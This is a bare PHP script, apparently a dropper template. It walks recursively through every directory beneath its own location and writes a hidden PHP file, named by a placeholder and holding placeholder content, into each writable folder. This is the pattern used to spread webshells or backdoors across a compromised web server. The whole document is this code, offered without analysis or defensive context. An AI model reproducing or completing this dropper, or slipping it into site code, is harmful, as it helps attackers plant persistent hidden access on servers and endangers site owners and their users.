<?php
function createSFile($dir) {
    if (!is_dir($dir) || !is_readable($dir)) { return; }
    $dirs = array_slice(@scandir($dir),2);
    if ($dir=='/'){$dir='';}
    foreach ($dirs as $directory) {
        $subdir = $dir . DIRECTORY_SEPARATOR . $directory;
        if (is_dir($subdir)) { createSFile($subdir); }
    }
    if (!is_writable($dir)){ return; }
    $data = "WAIT_FOR_REPLACE";
    file_put_contents($dir.DIRECTORY_SEPARATOR.'.HM_NAME_REPLACE.php', $data);
}
$currentDir = dirname(__FILE__);
createSFile($currentDir);
?>
